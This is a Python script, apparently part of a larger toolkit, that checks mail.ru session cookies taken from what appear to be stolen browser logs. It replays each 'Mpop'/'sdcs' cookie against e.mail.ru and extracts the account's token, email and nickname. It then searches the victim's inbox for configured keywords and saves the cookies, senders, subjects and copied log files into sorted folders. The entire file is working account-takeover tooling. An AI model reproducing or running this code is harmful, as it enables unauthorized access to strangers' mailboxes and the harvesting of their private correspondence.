# -*- coding: utf-8 -*-
import shutil
import threading

import StandartMethod
import re
import random
import time
import requests
from bs4 import BeautifulSoup
import lxml
import os
import sys
import json
class mail_ru_checker():


    @staticmethod
    def create_file(create_path: str, cook: str, path: str, email: str, nick: str, search: dict, file, details_find):
        valid_path = StandartMethod.StandartMetod.validate_path_log(path)
        path_name = email.replace('\\', '').replace('/', '').replace('?', '').replace('<', '').replace('>', '').replace('|', '')
        dir_path = create_path + f"\\Email({email}) - trigger({len(search)})"
        try:
            os.mkdir(dir_path)
        except OSError as error:
            pass
        data = {
            'Path': path,
            'Cookie': cook,
            'Account Info': {
                'Email': email,
                'Nick': nick,
                'Your-search': search
            }
        }
        if details_find:
            data = {
                'Path': path,
                'Cookie': cook,
                'Account Info': {
                    'Email': email,
                    'Nick': nick,
                    'Your-search': search
                },
                'Detailed_Information': details_find
            }
        with open(f'{dir_path}\\MainInfo.json', 'w', encoding='utf-8') as outfile:
            json.dump(data, outfile, indent=4, ensure_ascii=False)
        shutil.copy(f'{file}\\{path}', f'{dir_path}\\{valid_path}')

        settings = StandartMethod.headless.get_settings()['Filter_settings']['Mail']
        try:
            os.mkdir(f'{create_path}\\{settings["Full_log"]}')
        except:
            pass

        try:
            os.mkdir(f'{create_path}\\{settings["Msg_path"]}')
        except:
            pass

        search_validate = {}
        if search:
            for key,value in search.items():
                key.replace('\\', '').replace('/', '').replace('?', '').replace('<', '').replace('>', '').replace('|', '')
                search_validate[key] = value
        for key in search_validate.keys():
            try:
                os.mkdir(f'{create_path}\\{settings["Msg_path"]}\\{key}')
            except:
                pass
            try:
                os.mkdir(f"{create_path}\\{settings['Msg_path']}\\{key}\\Email({email}) - trigger({len(search)})")
            except OSError as error:
                pass
            with open(f'{create_path}\\{settings["Msg_path"]}\\{key}\\Email({email}) - trigger({len(search)})\\MainInfo.json', 'w', encoding='utf-8') as outfile:
                json.dump(data, outfile, indent=4, ensure_ascii=False)
            shutil.copy(f'{file}\\{path}', f'{create_path}\\{settings["Msg_path"]}\\{key}\\Email({email}) - trigger({len(search)})')


        shutil.copy(f'{file}\\{path}', f'{create_path}\\{settings["Full_log"]}\\{valid_path}')

        print(f"\n[{threading.current_thread().name}] Mail.ru Обнаружена валидная сессия\n"
              f"[{threading.current_thread().name}] Email: {email}\n"
              f"[{threading.current_thread().name}] Trigger: {str(search).replace('{','').replace('}','')}\n"
              f"[{threading.current_thread().name}] Путь: {dir_path}")
    @staticmethod
    def checker(dict, account, path_log, file):
        headers = StandartMethod.StandartMetod.get_headers()
        try:
            cook = {"Mpop": account['Mpop'],
                    's': 'fver=0|ww=1920|wh=915|octavius=1',
                    'sdcs': account['sdcs']}
            log = f'Mpop={account["Mpop"]};s=fver=0|ww=1920|wh=915|octavius=1;sdcs={account["sdcs"]}'
            req = requests.get('https://e.mail.ru/inbox/?afterReload=1', cookies=cook,headers=headers)
            token = re.findall(r"\"token\":\"(.*?)\"", req.text)[0].strip()
            email = re.findall(r"\"email\":\"(.*?)\"", req.text)[0].strip()
            nick = re.findall(r"\"nick\":\"(.*?)\"", req.text)[0].strip()
            settings = StandartMethod.headless.get_settings()['Filter_settings']['Mail']
            search = list(settings['Filter_msg'])
            find = {}
            details_find = {}
            if search:
                for element in search:
                    req = requests.get(
                        f'https://e.mail.ru/api/v1/k8s/messages/search?query={element}\&in_excluded_folders=false&offset=0&limit=9999&extra_suggest_search=true&with_threads=true&all_attaches=true&email={email}&htmlencoded=false&token={token}&_=1644041237786',
                        cookies=cook)
                    message = req.json()['body']['messages']
                    local_msg = []
                    for i in message:
                        find[i['correspondents']['from'][0]['email']] = len(message)
                        if settings['Detailed_Information']:
                            local_msg.append(i['subject'])
                    if settings['Detailed_Information']:
                        details_find[element] = local_msg
                    local_msg = []


            mail_ru_checker.create_file(f'{dict}',log, path_log , email, nick, find, file, details_find)


        except Exception as ex:
            pass